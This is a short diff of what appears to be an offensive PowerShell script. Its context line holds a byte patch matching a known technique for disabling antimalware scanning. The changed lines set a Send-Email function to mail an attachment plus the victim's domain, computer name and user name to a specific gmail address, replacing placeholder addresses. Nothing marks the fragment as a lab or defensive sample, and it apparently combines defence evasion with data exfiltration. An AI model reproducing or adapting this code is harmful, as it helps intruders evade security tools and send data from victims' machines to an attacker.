@@ -45,8 +45,8 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 # Send Email function
 function Send-Email {
-    $From = "From@Gmail.com"
-    $To = "To@gmail.com"
+    $From = "cynetrir@gmail.com"
+    $To = "cynetrir@gmail.com"
     $Attachment = $args[0]
     $Subject = "Email Subject"
     $Body = "UserDomain: " + $env:UserDomain + " ComputerName: " + $env:ComputerName + " UserName: " + $env:UserName + " Attachment: " + [io.path]::GetFileName($args[0])
